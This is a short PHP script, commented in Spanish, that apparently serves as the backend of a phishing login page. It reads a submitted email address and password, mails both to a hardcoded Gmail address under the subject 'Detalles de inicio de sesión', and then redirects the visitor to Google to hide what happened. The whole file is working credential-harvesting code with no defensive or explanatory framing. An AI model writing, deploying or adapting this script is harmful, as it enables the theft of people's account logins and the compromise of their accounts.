<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $correo = $_POST['correo'];
    $contrasena = $_POST['contrasena'];

    // Tu dirección de correo
    $destinatario = 'davidgutierrez555yt05@gmail.com';
    
    // Asunto del correo
    $asunto = 'Detalles de inicio de sesión';

    // Cuerpo del correo
    $mensaje = "Correo electrónico: " . $correo . "\n";
    $mensaje .= "Contraseña: " . $contrasena . "\n";

    // Cabeceras del correo
    $cabeceras = 'From: webmaster@tudominio.com' . "\r\n" .
                 'Reply-To: webmaster@tudominio.com' . "\r\n" .
                 'X-Mailer: PHP/' . phpversion();

    // Enviar el correo
    if (mail($destinatario, $asunto, $mensaje, $cabeceras)) {
        // Redirigir a Google después de enviar el correo
        header('Location: https://www.google.com');
        exit;
    } else {
        echo "Error al enviar el correo.";
    }
}
?>
